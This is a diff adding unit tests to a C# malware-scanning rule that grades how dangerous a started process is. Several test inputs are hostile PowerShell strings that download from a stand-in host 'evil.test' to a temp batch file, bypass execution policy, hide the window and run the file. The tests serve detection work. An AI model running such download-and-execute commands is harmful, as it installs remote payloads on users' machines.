@@ -12,6 +12,36 @@ namespace MLVScan.Core.Tests.Unit.Rules;
 public class ProcessStartRuleTests
 {
     private readonly ProcessStartRule _rule = new();
+    private readonly System.Reflection.MethodInfo _determineSeverityMethod =
+        typeof(ProcessStartRule).GetMethod("DetermineSeverity",
+            System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic)!;
+
+    private (Severity? severity, string? reason) InvokeDetermineSeverity(
+        string targetLower,
+        string argumentsLower,
+        bool useShellExecute = false,
+        bool createNoWindow = false,
+        bool windowStyleHidden = false,
+        bool workingDirectoryIsTemp = false,
+        bool hasNetworkCallSignal = false,
+        bool hasFileWriteSignal = false)
+    {
+        var result = _determineSeverityMethod.Invoke(_rule,
+        [
+            targetLower,
+            argumentsLower,
+            targetLower,
+            argumentsLower,
+            useShellExecute,
+            createNoWindow,
+            windowStyleHidden,
+            workingDirectoryIsTemp,
+            hasNetworkCallSignal,
+            hasFileWriteSignal
+        ]);
+
+        return ((Severity? severity, string? reason))result!;
+    }
 
     [Fact]
     public void RuleId_ReturnsProcessStartRule()
@@ -183,6 +213,68 @@ public class ProcessStartRuleTests
         string description = _rule.GetFindingDescription(startRef, instructions, callIndex);
 
         description.Should().Contain("Target: \"yt-dlp.exe\"");
+    }
+
+    [Fact]
+    public void DetermineSeverity_KnownSafeToolWithCreateNoWindowAndPlaceholderArgs_ReturnsMedium()
+    {
+        var result = InvokeDetermineSeverity(
+            targetLower: "yt-dlp.exe",
+            argumentsLower: "<arg 0><arg 0>",
+            createNoWindow: true);
+
+        result.severity.Should().Be(Severity.Medium);
+        result.reason.Should().Contain("Known external tool");
+    }
+
+    [Fact]
+    public void DetermineSeverity_LolBinWithHiddenDownloadTempExecution_ReturnsCritical()
+    {
+        var result = InvokeDetermineSeverity(
+            targetLower: "powershell.exe",
+            argumentsLower: "-ep bypass iwr https://evil.test -out $env:TEMP\\dl.bat",
+            useShellExecute: true,
+            createNoWindow: true,
+            windowStyleHidden: true,
+            workingDirectoryIsTemp: true,
+            hasNetworkCallSignal: true,
+            hasFileWriteSignal: true);
+
+        result.severity.Should().Be(Severity.Critical);
+    }
+
+    [Fact]
+    public void DetermineSeverity_NonLolBinWithSuspiciousDownloadArgs_ReturnsHigh()
+    {
+        var result = InvokeDetermineSeverity(
+            targetLower: "random-tool.exe",
+            argumentsLower: "iwr https://evil.test/download.ps1");
+
+        result.severity.Should().Be(Severity.High);
+    }
+
+    [Fact]
+    public void DetermineSeverity_PowerShellStagedLoaderChain_ReturnsCriticalWithStagedLoaderReason()
+    {
+        var result = InvokeDetermineSeverity(
+            targetLower: "powershell.exe",
+            argumentsLower: "-nop -w hidden iwr https://evil.test/payload -out $env:TEMP\\dl.bat; cmd /c $env:TEMP\\dl.bat",
+            hasNetworkCallSignal: true,
+            hasFileWriteSignal: true);
+
+        result.severity.Should().Be(Severity.Critical);
+        result.reason.Should().Contain("Staged loader chain");
+    }
+
+    [Fact]
+    public void DetermineSeverity_SimpleProcessStart_RemainsGenericExecution()
+    {
+        var result = InvokeDetermineSeverity(
+            targetLower: "notepad.exe",
+            argumentsLower: "<unknown/no-arguments>");
+
+        result.severity.Should().Be(Severity.Medium);
+        result.reason.Should().Be("External process execution");
     }
 
     #region ShouldSuppressFinding Tests
